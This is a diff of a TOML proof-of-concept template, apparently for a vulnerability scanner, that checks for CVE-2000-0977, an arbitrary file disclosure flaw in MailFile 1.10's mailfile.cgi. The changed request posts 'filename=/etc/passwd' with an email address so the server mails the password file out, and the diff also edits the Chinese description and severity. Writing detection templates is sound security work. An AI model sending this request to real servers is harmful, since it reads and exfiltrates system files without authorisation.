@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "利用 MailFile 1.10 软件中的 mailfile.cgi CGI 程序漏洞，通过路径遍历攻击技术向目标服务器提交包含任意文件路径的 POST 请求，实现对目标服务器敏感文件（如配置文件、密码文件等）的远程读取。该漏洞影响广泛，攻击者无需任何身份验证即可远程执行攻击，攻击难度较低。"
+author = "AVE"
+description = "检测 Oatmeal Studios MailFile 1.10 mailfile.cgi 任意文件读取漏洞。通过 POST 请求向 filename 参数传入目标文件路径，服务器将文件内容通过邮件发送至指定地址。"
 id = "POC-AVE-2000-0713"
-name = "CVE-2000-0977 Arbitrary File Disclosure PoC"
-severity = "high"
-tags = ["ave-2000-0713"]
+name = "CVE-2000-0977 PoC"
+severity = "medium"
+tags = ["cve-2000-0977"]
 vuln_id = [
     "CVE-2000-0977",
     "AVE-2000-0713",
@@ -15,18 +15,22 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/mailfile.cgi"
+path = "/{{BaseURL}}/cgi-bin/mailfile.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "filename={{TargetFilePath}}"
-type = "form"
+content = "filename=/etc/passwd&email=test@test.com"
+type = "raw"
 
 [poc.requests.headers]
-User-Agent = "AVE/1.0"
+Content-Type = "application/x-www-form-urlencoded"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["file content"]
+words = [
+    "mail",
+    "sent",
+    "successfully",
+]
